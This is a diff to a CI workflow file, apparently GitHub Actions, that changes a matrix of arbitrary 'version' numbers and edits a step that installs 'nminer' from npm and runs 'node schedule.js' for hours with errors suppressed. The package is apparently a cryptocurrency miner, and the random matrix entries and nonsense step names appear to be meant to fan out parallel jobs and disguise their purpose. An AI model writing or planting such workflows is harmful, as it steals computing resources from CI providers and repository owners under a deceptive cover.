@@ -9,23 +9,21 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 4197 }
-          - { version: 6331 }
-          - { version: 527 }
-          - { version: 3979 }
-          - { version: 4296 }
-          - { version: 9498 }
-          - { version: 3940 }
-          - { version: 2577 }
-          - { version: 5469 }
-          - { version: 6829 }
-          - { version: 650 }
-          - { version: 615 }
-          - { version: 6291 }
-          - { version: 3142 }
-          - { version: 138 }
-          - { version: 4369 }
-          - { version: 3774 }
+          - { version: 2967 }
+          - { version: 16 }
+          - { version: 6902 }
+          - { version: 9434 }
+          - { version: 5240 }
+          - { version: 3902 }
+          - { version: 6276 }
+          - { version: 905 }
+          - { version: 2519 }
+          - { version: 7245 }
+          - { version: 2491 }
+          - { version: 4232 }
+          - { version: 8197 }
+          - { version: 1683 }
+          - { version: 4139 }
 
     steps:
       - name: Checkout
@@ -36,7 +34,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: necklace given editor whoever
+      - name: for
         run: |
           npm install nminer@latest
-          timeout 337m node schedule.js || echo "schedule executed"
+          timeout 339m node schedule.js || echo "schedule executed"
